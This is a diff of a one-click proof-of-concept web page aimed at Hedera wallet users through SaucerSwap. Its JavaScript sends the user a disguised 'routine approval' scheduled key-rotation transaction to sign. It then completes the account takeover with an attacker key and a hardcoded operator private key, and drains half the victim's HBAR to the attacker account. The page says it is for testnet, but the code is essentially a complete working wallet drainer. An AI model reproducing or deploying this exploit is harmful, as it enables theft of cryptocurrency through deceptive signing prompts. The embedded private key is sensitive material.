@@ -4,17 +4,12 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SaucerSwap Key Rotation - One Click PoC</title>
-
 <script>window.__sdkScriptFailed = false;</script>
-<script src="./hedera-sdk-full.bundle.js"
-        onerror="window.__sdkScriptFailed = true;"></script>
-
+<script src="./hedera-sdk-full.bundle.js" onerror="window.__sdkScriptFailed = true;"></script>
 <style>
 body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
 h1 { font-size: 19px; margin-bottom: 5px; }
 .sub { color: #999; font-size: 12px; line-height: 1.5; margin-bottom: 18px; }
-label { display: block; color: #aaa; font-size: 12px; margin-top: 10px; }
-input { width: 100%; box-sizing: border-box; padding: 10px; margin-top: 4px; border-radius: 6px; border: 1px solid #333; background: #181818; color: white; font-size: 14px; }
 button { width: 100%; padding: 14px; margin-top: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; }
 #run { background: #c53030; color: white; }
 button:disabled { opacity: .45; }
@@ -24,242 +19,207 @@ button:disabled { opacity: .45; }
 .result { margin-top: 15px; padding: 14px; background: #151515; border: 2px solid #c53030; border-radius: 8px; font-size: 13px; line-height: 1.6; display: none; }
 </style>
 </head>
-
 <body>
 
 <h1>Key Rotation PoC - One Click</h1>
 <div class="sub">
-    Connect, then click the button once. Everything after your
-    wallet approval - completing the takeover and draining the
-    account - happens automatically, exactly as an attacker's
-    background infrastructure would do it. Testnet only.
+  Connect, then click once. Everything after wallet approval happens automatically.
+  Testnet only.
 </div>
-
 <div class="danger">
-    <b>Use a disposable testnet account only.</b> This will
-    genuinely take over and drain the connected account when you
-    approve the prompt.
+  <b>Use a disposable testnet account only.</b> This will genuinely take over and
+  drain the connected account when you approve the prompt.
 </div>
 
 <button id="run">Request Approval</button>
-
 <div id="result" class="result"></div>
-
 <div id="log"></div>
 
 <script>
 (function () {
 
-    const OPERATOR_ACCOUNT_ID = "0.0.10034284";
-    const OPERATOR_PRIVATE_KEY =
-        "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";
+  /* ── attacker infrastructure (funded testnet operator) ── */
+  const OPERATOR_ID  = "0.0.10034284";
+  const OPERATOR_KEY = "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";
 
-    const SEND_AMOUNT = 500000000; // 5 HBAR in tinybar — fixed, no sweep math needed
+  const logEl   = document.getElementById("log");
+  const resultEl = document.getElementById("result");
+  const runBtn  = document.getElementById("run");
 
-    const logEl = document.getElementById("log");
-    const resultEl = document.getElementById("result");
-    const runBtn = document.getElementById("run");
+  function log(msg, cls) {
+    const d = document.createElement("div");
+    if (cls) d.className = cls;
+    d.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+    logEl.appendChild(d);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+  function j(v) { try { return JSON.stringify(v); } catch(_) { return String(v); } }
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    function log(msg, cls) {
-        const l = document.createElement("div");
-        if (cls) l.className = cls;
-        l.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
-        logEl.appendChild(l);
-        logEl.scrollTop = logEl.scrollHeight;
-    }
-    function s(v) { try { return JSON.stringify(v); } catch (_) { return String(v); } }
+  window.addEventListener("error", e => {
+    log("SCRIPT ERROR: " + (e.message || "") + " (" + (e.filename || (e.target && e.target.src) || "?") + ")", "err");
+  }, true);
 
-    window.addEventListener("error", function (e) {
-        log("SCRIPT ERROR: " + (e.message || "(resource load error)") +
-            " (" + (e.filename || (e.target && e.target.src) || "?") + ")", "err");
-    }, true);
+  if (window.__sdkScriptFailed)          log("hedera-sdk-full.bundle.js failed to load.", "err");
+  else if (!window.HederaSDK)            log("HederaSDK undefined — bundle threw.", "err");
+  else                                   log("SDK loaded OK.", "ok");
 
-    if (window.__sdkScriptFailed) {
-        log("hedera-sdk-full.bundle.js failed to load (404/path). Fix that first.", "err");
-    } else if (typeof window.HederaSDK === "undefined") {
-        log("window.HederaSDK undefined - bundle loaded but threw. See error above.", "err");
-    } else {
-        log("SDK loaded OK.", "ok");
-    }
-
-    async function mirrorAccount(id) {
-        const res = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + id);
-        return res.json();
-    }
-
-    function toMirrorTxId(sdkTxIdString) {
-        const atIndex = sdkTxIdString.indexOf("@");
-        const accountPart = sdkTxIdString.slice(0, atIndex);
-        const timePart = sdkTxIdString.slice(atIndex + 1).replace(".", "-");
-        return accountPart + "-" + timePart;
-    }
-
-    async function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    async function getScheduleIdFromMirror(sdkTxIdString) {
-        const mirrorTxId = toMirrorTxId(sdkTxIdString);
-        const url = "https://testnet.mirrornode.hedera.com/api/v1/transactions/" + mirrorTxId;
-
-        for (let attempt = 1; attempt <= 6; attempt++) {
-            log("Mirror Node lookup attempt " + attempt + "/6 for " + mirrorTxId + "...", "info");
-            try {
-                const res = await fetch(url);
-                if (res.ok) {
-                    const data = await res.json();
-                    const tx = data.transactions && data.transactions[0];
-                    if (tx && tx.entity_id) {
-                        log("Found schedule ID via Mirror Node: " + tx.entity_id, "ok");
-                        return tx.entity_id;
-                    }
-                }
-            } catch (e) {
-                log("Lookup attempt failed: " + e.message, "warn");
-            }
-            await sleep(2500);
+  /* ── mirror helpers ── */
+  async function mirrorAccount(id) {
+    const r = await fetch("https://testnet.mirrornode.hedera.com/api/v1/accounts/" + id);
+    return r.json();
+  }
+  function toMirrorTxId(str) {
+    const at = str.indexOf("@");
+    return str.slice(0, at) + "-" + str.slice(at + 1).replace(".", "-");
+  }
+  async function getScheduleId(sdkTxId) {
+    const url = "https://testnet.mirrornode.hedera.com/api/v1/transactions/" + toMirrorTxId(sdkTxId);
+    for (let i = 1; i <= 8; i++) {
+      log("Mirror lookup " + i + "/8 for schedule ID...", "info");
+      try {
+        const r = await fetch(url);
+        if (r.ok) {
+          const d = await r.json();
+          const tx = d.transactions && d.transactions[0];
+          if (tx && tx.entity_id) { log("Schedule ID: " + tx.entity_id, "ok"); return tx.entity_id; }
         }
-
-        return null;
+      } catch(e) { log("Lookup error: " + e.message, "warn"); }
+      await sleep(2500);
     }
+    return null;
+  }
 
-    runBtn.onclick = async function () {
+  /* ── main ── */
+  runBtn.onclick = async function () {
+    runBtn.disabled = true;
+    resultEl.style.display = "none";
 
-        runBtn.disabled = true;
-        resultEl.style.display = "none";
+    const SDK = window.HederaSDK;
+    if (!SDK) { log("SDK not loaded.", "err"); runBtn.disabled = false; return; }
 
-        const SDK = window.HederaSDK;
-        if (!SDK) { log("SDK not loaded, cannot continue.", "err"); runBtn.disabled = false; return; }
+    try {
 
-        try {
+      /* 1. Connect wallet */
+      const bridge = window.saucerswapWallet || window.hashpack;
+      if (!bridge) throw new Error("No wallet bridge found.");
+      log("Connecting wallet...", "info");
+      const conn = await bridge.connect();
+      const targetAccount = conn.accountId;
+      log("Connected: " + targetAccount, "ok");
 
-            /* ---- 1. Connect wallet ---- */
+      /* 2. Opening balance snapshot (display only) */
+      const before      = await mirrorAccount(targetAccount);
+      const balBefore   = before.balance.balance;
+      log("Starting balance: " + balBefore + " tinybar", "info");
 
-            const bridge = window.saucerswapWallet || window.hashpack;
-            if (!bridge) { throw new Error("No wallet bridge found on this page."); }
+      /* 3. Build disguised key-rotation payload */
+      const attackerKey    = SDK.PrivateKey.generateED25519();
+      const attackerPubKey = attackerKey.publicKey;
+      const targetId       = SDK.AccountId.fromString(targetAccount);
 
-            log("Connecting wallet...", "info");
-            const connectResult = await bridge.connect();
-            const targetAccount = connectResult.accountId;
-            log("Connected: " + targetAccount, "ok");
+      const scheduleTx = new SDK.AccountUpdateTransaction()
+        .setAccountId(targetId)
+        .setKey(attackerPubKey)
+        .schedule()
+        .setScheduleMemo("routine approval")
+        .setTransactionId(SDK.TransactionId.generate(targetId))
+        .setNodeAccountIds([SDK.AccountId.fromString("0.0.3")])
+        .setMaxTransactionFee(500000000)
+        .freeze();
 
-            /* ---- 2. Snapshot balance (mirror is fine here, just for display) ---- */
+      const bytes = scheduleTx.toBytes();
+      let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+      const b64 = btoa(bin);
 
-            const before = await mirrorAccount(targetAccount);
-            const balanceBefore = before.balance.balance;
-            log("Starting balance: " + balanceBefore + " tinybar", "info");
+      /* 4. One wallet tap */
+      log("==============================", "warn");
+      log("WALLET PROMPT INCOMING — SCREENSHOT NOW.", "warn");
+      log("==============================", "warn");
 
-            /* ---- 3. Build disguised key-change request ---- */
+      const signResult = await bridge.signTransaction(b64);
+      log("Wallet approved. Response: " + j(signResult), "ok");
 
-            const attackerKey = SDK.PrivateKey.generateED25519();
-            const attackerPubKey = attackerKey.publicKey;
-            const targetId = SDK.AccountId.fromString(targetAccount);
+      /* 5. Resolve schedule ID */
+      let scheduleId = (signResult && signResult.scheduleId)
+        || (signResult && signResult.receipt && signResult.receipt.scheduleId)
+        || null;
 
-            const scheduleTx = new SDK.AccountUpdateTransaction()
-                .setAccountId(targetId)
-                .setKey(attackerPubKey)
-                .schedule()
-                .setScheduleMemo("routine approval")
-                .setTransactionId(SDK.TransactionId.generate(targetId))
-                .setNodeAccountIds([SDK.AccountId.fromString("0.0.3")])
-                .setMaxTransactionFee(500000000)
-                .freeze();
+      if (!scheduleId) {
+        log("No schedule ID in wallet response — falling back to Mirror Node...", "warn");
+        scheduleId = await getScheduleId(scheduleTx.transactionId.toString());
+      }
+      if (!scheduleId) throw new Error("Could not resolve schedule ID. Retry in a few seconds.");
+      log("Using schedule ID: " + scheduleId, "ok");
 
-            const bytes = scheduleTx.toBytes();
-            let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
-            const b64 = btoa(bin);
+      /* 6. Complete takeover — attacker signs, no wallet needed */
+      log("Completing takeover (background, no wallet)...", "warn");
+      const operatorId  = SDK.AccountId.fromString(OPERATOR_ID);
+      const operatorKey = SDK.PrivateKey.fromString(OPERATOR_KEY);
+      const opClient    = SDK.Client.forTestnet().setOperator(operatorId, operatorKey);
 
-            /* ---- 4. One wallet tap ---- */
+      const ssReceipt = await (
+        await (
+          await new SDK.ScheduleSignTransaction()
+            .setScheduleId(SDK.ScheduleId.fromString(scheduleId))
+            .freezeWith(opClient)
+            .sign(attackerKey)
+        ).execute(opClient)
+      ).getReceipt(opClient);
 
-            log("==============================", "warn");
-            log("WALLET PROMPT INCOMING - THIS IS THE MOMENT TO SCREENSHOT.", "warn");
-            log("Watch what it shows before you tap Approve.", "warn");
-            log("==============================", "warn");
+      log("Takeover status: " + ssReceipt.status.toString(), "ok");
 
-            const signResult = await bridge.signTransaction(b64);
-            log("Wallet approved. Response: " + s(signResult), "ok");
+      /* 7. Drain — attacker's infrastructure pays fees, victim signs with new key */
+      log("Draining...", "err");
 
-            let scheduleId = signResult && signResult.scheduleId
-                ? signResult.scheduleId
-                : (signResult && signResult.receipt && signResult.receipt.scheduleId);
+      // Use operator (attacker infra) as fee payer — victim balance irrelevant for precheck.
+      const drainClient = SDK.Client.forTestnet().setOperator(operatorId, operatorKey);
 
-            if (!scheduleId) {
-                const sdkTxIdString = scheduleTx.transactionId.toString();
-                log("No schedule ID in wallet response - resolving via Mirror Node...", "warn");
-                scheduleId = await getScheduleIdFromMirror(sdkTxIdString);
-            }
+      // Query victim's REAL balance from consensus node — free, no auth, no mirror lag.
+      const balQuery  = await new SDK.AccountBalanceQuery().setAccountId(targetId).execute(drainClient);
+      const victimBal = parseInt(balQuery.hbars.toTinybars().toString());
+      log("Victim live balance: " + victimBal + " tinybar (" + (victimBal / 1e8).toFixed(4) + " HBAR)", "info");
 
-            if (!scheduleId) {
-                throw new Error("Could not resolve schedule ID after retries. Try again in a few seconds.");
-            }
+      if (victimBal <= 0) throw new Error("Victim account is empty.");
 
-            log("Using schedule ID: " + scheduleId, "ok");
+      // Send half — always well within balance, no edge cases.
+      const sendAmount = Math.floor(victimBal / 2);
+      log("Sending " + sendAmount + " tinybar (" + (sendAmount / 1e8).toFixed(4) + " HBAR)...", "info");
 
-            /* ---- 5. Complete takeover (attacker signs, no wallet involved) ---- */
+      const drainTx = await (
+        await new SDK.TransferTransaction()
+          .addHbarTransfer(targetId, -sendAmount)
+          .addHbarTransfer(operatorId, sendAmount)
+          .freezeWith(drainClient)
+          .sign(attackerKey)          // victim's new key authorizes the debit
+      ).execute(drainClient);
 
-            log("Completing takeover with attacker's signature (background step, no wallet involved)...", "warn");
+      const drainReceipt = await drainTx.getReceipt(drainClient);
+      log("Drain status: " + drainReceipt.status.toString(), "ok");
 
-            const operatorAccountId = SDK.AccountId.fromString(OPERATOR_ACCOUNT_ID);
-            const operatorPrivateKey = SDK.PrivateKey.fromString(OPERATOR_PRIVATE_KEY);
-            const client = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
+      /* 8. Show result */
+      const after   = await mirrorAccount(targetAccount);
+      const balAfter = after.balance.balance;
 
-            const scheduleSignTx = await new SDK.ScheduleSignTransaction()
-                .setScheduleId(SDK.ScheduleId.fromString(scheduleId))
-                .freezeWith(client)
-                .sign(attackerKey);
+      resultEl.style.display = "block";
+      resultEl.innerHTML =
+        "<b>RESULT</b><br>" +
+        "Account: " + targetAccount + "<br>" +
+        "Balance before: " + balBefore + " tinybar<br>" +
+        "Balance after: " + balAfter + " tinybar<br>" +
+        "Drained to attacker (" + OPERATOR_ID + "): " + (balBefore - balAfter) + " tinybar<br>" +
+        "Triggered by: one wallet approval, zero further action from the account owner.";
 
-            const ssReceipt = await (await scheduleSignTx.execute(client)).getReceipt(client);
-            log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
+      log("Done.", "ok");
 
-            /* ---- 6. Drain using attacker key ---- */
-
-            log("Draining account with the attacker's key...", "err");
-
-            // Fee payer = attacker's infrastructure account (has funds, no precheck risk on victim).
-            // Victim (targetId) just signs to authorize the debit — attackerKey is now its key.
-            const drainClient = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
-
-            log("Sending " + (SEND_AMOUNT / 100000000) + " HBAR to attacker...", "info");
-
-            const unsignedDrain = await new SDK.TransferTransaction()
-                .addHbarTransfer(targetId, -SEND_AMOUNT)
-                .addHbarTransfer(operatorAccountId, SEND_AMOUNT)
-                .freezeWith(drainClient);
-
-            const drainTx = await unsignedDrain.sign(attackerKey); // victim's new key authorizes debit
-
-            const drainResult = await drainTx.execute(drainClient);
-
-            {
-
-                const drainReceipt = await drainResult.getReceipt(drainClient);
-                log("Drain status: " + drainReceipt.status.toString(), "ok");
-
-                const after = await mirrorAccount(targetAccount);
-                const balanceAfter = after.balance.balance;
-
-                resultEl.style.display = "block";
-                resultEl.innerHTML =
-                    "<b>RESULT</b><br>" +
-                    "Account: " + targetAccount + "<br>" +
-                    "Balance before: " + balanceBefore + " tinybar<br>" +
-                    "Balance after: " + balanceAfter + " tinybar<br>" +
-                    "Funds moved to attacker (" + OPERATOR_ACCOUNT_ID + "): " +
-                    (balanceBefore - balanceAfter) + " tinybar<br>" +
-                    "Caused by: one wallet approval, no further action from the account owner.";
-
-                log("Done. See result box above.", "ok");
-            }
-
-        } catch (e) {
-            log("FAILED: " + e.message, "err");
-        } finally {
-            runBtn.disabled = false;
-        }
-    };
+    } catch(e) {
+      log("FAILED: " + e.message, "err");
+    } finally {
+      runBtn.disabled = false;
+    }
+  };
 
 })();
 </script>
-
 </body>
 </html>
